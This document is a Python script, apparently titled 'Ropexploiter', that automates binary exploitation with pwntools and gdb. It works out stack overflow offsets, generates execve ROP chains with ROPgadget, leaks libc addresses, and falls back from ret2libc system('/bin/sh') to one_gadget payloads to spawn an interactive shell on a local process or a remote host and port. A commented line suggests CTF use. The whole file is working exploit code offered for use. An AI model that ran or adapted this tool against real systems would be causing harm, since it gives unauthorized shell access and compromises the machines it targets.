
import subprocess


try:
    from pwn import *

    from pygdbmi.gdbcontroller import GdbController
    from pprint import pprint
    import sys

    from pwn import p64,u64
    from clint.arguments import Args
    from clint.textui import puts, colored, indent
    import struct
except:
    os.system("python3 -m pip install pwntools")
    os.system("python3 -m pip install pygdbmi")
    os.system("python3 -m pip install clint")
    os.system("python3 -m pip install pprint")
    print("Run me again!!!")
    exit()
import ret2lib

banner = """   ___  ____  ___                __     _ __         
  / _ \/ __ \/ _ \_____ __ ___  / /__  (_) /____ ____
 / , _/ /_/ / ___/ -_) \ // _ \/ / _ \/ / __/ -_) __/
/_/|_|\____/_/   \__/_\_\/ .__/_/\___/_/\__/\__/_/   
                        /_/                          
                                coded by script1337
                                version = 0.1 beta
"""
                                                                     
gdbmi = GdbController()
arch = ""
x = 0
def output(output):
    with indent(4, quote='>>>'):
        puts(colored.blue("    " + str(output)))

try:
    with indent(4, quote='>>>'):
        puts(colored.red(banner))
    binary = sys.argv[1]
except:
    output("example : python Ropexploiter.py binary libc ")
    output("example : python Ropexploiter.py binary libc host port")
    exit()
try:
    libc = sys.argv[2]
except:
    libc = ""

# Load binary a.out and get structured response
response = gdbmi.write('file ' + binary)
out = subprocess.Popen(['checksec', binary], 
           stdout=subprocess.PIPE, 
           stderr=subprocess.STDOUT)

args = Args()


def getoffset(number,turn):
    if turn == 0:
        out = cyclic(number).decode()
    else:
        out = cyclic_find(number.encode())
    return str(out)

def checkbinary(output):
    with indent(4, quote='>>>'):
        puts(colored.yellow('    Checking the binary : ') + colored.blue(str("\n" + output)))


def hexdecode(data):
    bytes_object = bytes.fromhex(data)
    pattern = bytes_object.decode("ASCII")
    return pattern

def gdbwo(command):
    response = gdbmi.write(command)
    return response


stdout,stderr = out.communicate()
checkbin = stdout.decode().replace("[*]", "   ")
checkbin = checkbin.replace("'","")
if "amd64-64" in checkbin:
    arch = "64"
else:
    arch = "32"
checkbinary(checkbin)

def makechain(chain):
    ropchain = []
    chain = chain.split()
    x = 0
    payload_index = chain.index("execve")
    ropchain_payload = chain[payload_index + 15:]
    ropchain_payload[1] = "="
    output("++++++++++++++++++++++ R0Pch41n BU1LD +++++++++++++++++++++++")
    payload = ' '.join(map(str, ropchain_payload)).replace("' p","'\n    p").replace("ret","ret \n")
    ropchain_payload = payload.replace("pack('<Q', ","p64(")
    payload = ropchain_payload.split()
    for byte in payload:
        if byte.startswith("p64(") or byte.startswith("'/"):
            if byte.startswith("p64("):
                #output(byte)
                ropchain.append(eval(byte)) 
            else:
                ropchain.append(byte.replace("'","").encode())
    #output(ropchain_payload.replace("ret \n","ret \n   "))
    return ropchain


def findgadget():
    out = subprocess.Popen(['ROPgadget', '--binary', binary, '--ropchain'], 
           stdout=subprocess.PIPE, 
           stderr=subprocess.STDOUT)
    stdout,stderr = out.communicate()
    if "execve generated by ROPgadget" in stdout.decode():
        rop_chain = makechain(stdout.decode())
        #output(stdout.decode())
        return rop_chain
    else:
        return False

def reverse(string): 
    string = "".join(reversed(string)) 
    return string 
  
def convert(s): 
    new = b"" 
    for x in s:
        new += x  
    return new 

def find_oneshot(oneshot):
    data = oneshot.split()
    p = []
    for i in data:
        if i.startswith("0x"):
            if len(str(i)) > 3:
                p.append(int(eval(i)))
    return p

def findleak(data):
    leak = []
    for i in data:
        if i.startswith("0x"):
            leak.append(i)
    return leak


def writepwn(payload):
    f = open("pwn","wb")
    f.write(payload)
    f.close()

def ret2libc(p,offset,libc_ad):
    global binary, libc,x
    data = ""
    libc_address = libc_ad
    libcx = ELF(libc)
    libcx.address = libc_address
    rop2 = ROP(libcx)
    rop = ROP(ELF(binary))

    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
    RET = (rop.find_gadget(['ret']))[0]
    BINSH =  next(libcx.search(b"/bin/sh")) - 64 
    SYSTEM = libcx.sym["system"]
    EXIT = libcx.sym["exit"]   
    p.sendline(fit({int(offset):p64(POP_RDI) + p64(BINSH) + p64(RET) + p64(SYSTEM) + p64(EXIT)}))
    p.sendline("echo pwn && whoami && id && hostname")
    try:
        data = str(p.recv())
        output(data)
    except Exception as e:
        x = 1
        output("RET2LIBC NOT WORKING")
        output("TRYING ONESHOT")
        exploitcommanrop(p,offset)
    if "pwn" in data:
        p.interactive()
    else:
        x = 1
        output("RET2LIBC NOT WORKING")
        output("TRYING ONESHOT")
        exploitcommanrop(p,offset)


def leak(host,port,offset,binary,libc,tylor_last_word,symbol):
    global x
    elf = ELF(binary)
    libc = ELF(libc)
    rop = ROP(elf)
    rop.call(elf.sym[symbol], [elf.got[symbol]])
    rop.call(elf.sym.main)
    success(rop.dump())
    if host != "":
        p = remote(host, port)
    else:
        p = process(binary)
    #p = remote('docker.hackthebox.eu', 32443)
    p.recvuntil(tylor_last_word)
    p.sendline(fit({int(offset):rop.chain()}))
    p.recv()
    puts = u64(p.recv()[:6].strip().ljust(8 , b'\x00'))
    output( "LEAKED " +str(symbol) + " > "+ str(hex(puts)))
    libc.address = puts - libc.symbols[symbol]
    if x == 0:
        ret2libc(p,offset,libc.address)
    else:
        exploit_oneshot(offset,p,tylor_last_word,symbol)

def exploitcommanrop(r,offset):
    global host,port, binary, libc,x
    if x == 0:
        pass
    else:
        if sys.argv[1].startswith("./"):
            r = process("./"+binary)
        else:
            r = process(binary)
    lol = str(r.recvline()[-2:])[-1:]
    output(lol)
    target = ELF(binary)
    puts = ""
    try:
        target.sym["puts"]
        puts = "puts"
    except:
        target.sym["printf"]
        puts = "printf"
    leak(host,port,offset,binary,libc,lol,puts)

def leak_for_oneshot(oneshot,offset,tylor_last_word,symbol):
    global host, port,binary,libc
    new = ""
    elf = ELF(binary)
    libc = ELF(sys.argv[2])
    rop = ROP(elf)
    rop.call(elf.sym[symbol], [elf.got[symbol]])
    rop.call(elf.sym.main)
    success(rop.dump())
    if host != "":
        p = remote(host, port)
    else:
        p = process(binary)
    p.recvuntil(tylor_last_word)
    p.sendline(fit({int(offset):rop.chain()}))
    p.recv()
    puts = u64(p.recv()[:6].strip().ljust(8 , b'\x00'))
    libc.address = puts - libc.symbols[symbol]
    payload = libc.address + oneshot 
    output("PAYLOAD > " + str(hex(payload)))
    p.sendline(fit({int(offset):p64(payload)}))
    p.sendline("echo pwn && whoami && id && hostname")
    try:
        new = str(p.recv())
        output(new)
    except Exception as f:
        pass
    if "pwn" in str(new):
        output("HOPE WE GET A SHELL")
        p.interactive()
    else:
        pass

def exploit_oneshot(offset,p,tylor_last_word,symbol):
    output("ret2libc NOT WORKING ")
    output("Trying oneshot")
    one = oneshot()
    output("ALL ONESHOT GadGET")
    for i in one:
        output( "ONESHOT > " + hex(i))
    for i in one:
        output("ONESHOT WITH ADDRESS > " + str(hex(i)))
        leak_for_oneshot(i,offset,tylor_last_word,symbol)


def oneshot():
    global libc
    out = subprocess.Popen(['one_gadget', libc], 
        stdout=subprocess.PIPE, 
        stderr=subprocess.STDOUT)
    stdout,stderr = out.communicate()
    
    if "constraints" in stdout.decode():
        oneshot = find_oneshot(stdout.decode())
        #output(stdout.decode())
        return oneshot
    else:
        return False

def exploit(offset,ropchain):
    if host != "":
        r = remote(host, port)
    else:
        r = process(binary)
    r.recvline()
    payload = convert(ropchain)
    payload = str("s"*int(offset)).encode() + payload
    r.sendline(payload)
    r.sendline("whoami && id && hostname")
    r.interactive()

run = gdbwo("r")
if arch == "64":
    rip = ""
    host = ""
    port = 0
    crash = gdbwo(getoffset(1000,0))
    register = gdbwo("info registers")
    try:
        rsp = gdbwo("x/wx " + register[8]["payload"].split()[1])
        rip = str(rsp[1]["payload"].split("\\t")[1][:-2])
    except:
        run = gdbwo("r " + getoffset(1000,0))
        register = gdbwo("info registers")
    
    output("RIP FOUND : " + rip)
    pattern = reverse(hexdecode(rip[2:]))
    offset = str(getoffset(pattern,1))
    output("OFFSET FOUND : " + offset)
    gdbwo("quit")
    ropchain = findgadget()
    if sys.argv[1].startswith("./"):
        r = process("./"+binary)
    else:
        r = process(binary)
    try:
        if sys.argv[3] != "":
            host = sys.argv[3]
            port = sys.argv[4]
    except:
        pass
    context.endian = "little"
    context.os = "linux"
    context.log_level = "debug"     
    context.timeout = 10
    if ropchain != False:
        exploit(offset,ropchain)
    elif libc != "":
        #libc = ELF(libc)
        #payload = run[-1]["payload"]
        exploitcommanrop(r,offset)
        #oneshot(payload.decode(),libc)
